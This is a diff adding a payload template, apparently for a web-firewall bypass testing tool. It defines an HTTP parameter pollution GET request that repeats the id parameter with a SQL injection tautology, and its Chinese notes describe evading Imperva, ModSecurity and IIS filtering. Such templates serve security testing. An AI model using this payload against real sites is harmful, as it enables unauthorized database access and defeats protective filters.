@@ -1,0 +1,13 @@
+# @name: HTTP参数污染(HPP-GET)
+# @tags: get,sqli,hpp,imperva,modsecurity,iis,id,bypass
+# @color: violet
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: hpp_duplicate_param
+# @intent.param: id
+# @intent.payload: id=1&id=1' and 'a'='a
+# @note: HTTP 参数污染：重复提交同名参数 id，不同后端取值规则(取首/取末/拼接)不同，可分裂关键字使单参数看起来无害（Imperva、ModSecurity、ASP.NET/IIS）。
+GET /?id=1&id=1'+and+'a'='a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+
